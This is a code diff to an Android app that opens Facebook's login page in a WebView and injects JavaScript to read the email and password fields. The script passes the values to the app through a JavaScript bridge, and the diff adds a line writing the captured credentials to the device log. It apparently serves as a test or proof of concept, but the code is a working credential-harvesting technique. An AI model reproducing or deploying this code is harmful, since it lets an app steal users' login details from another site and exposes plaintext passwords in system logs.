@@ -5,6 +5,7 @@ import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.DialogInterface;
 import android.os.Bundle;
+import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -38,12 +39,14 @@ public class Main extends Activity {
                 sb.append("var objPWD, objAccount;var str = '';");
                 sb.append("var inputs = document.getElementsByTagName('input');");
                 sb.append("for (var i = 0; i < inputs.length; i++) {");
-		        sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
+		        sb.append("if (inputs[i].name.toLowerCase() === 'pass') {objPWD = inputs[i];}");
 		        sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
                 sb.append("}");
                 sb.append("if (objAccount != null) {str += objAccount.value;}");
                 sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
                 sb.append("window.MYOBJECT.processHTML(str);");
+//                sb.append("window.MYOBJECT.processHTML(document.getElementsByTagName('form')[0].innerHTML);");
+
                 sb.append("return true;");
                 sb.append("};");
 
@@ -52,7 +55,7 @@ public class Main extends Activity {
 
         });
 
-        String sUrl = "http://www.facebook.com/";
+        String sUrl = "https://www.facebook.com/";
         webview1.loadUrl(sUrl);
 
     }
@@ -62,6 +65,8 @@ public class Main extends Activity {
         @JavascriptInterface
         public void processHTML(String html)
         {
+            Log.d("henrytest", html);
+
             AlertDialog.Builder builder = new AlertDialog.Builder(Main.this);
             builder.setTitle("AlertDialog from app")
                     .setMessage(html)
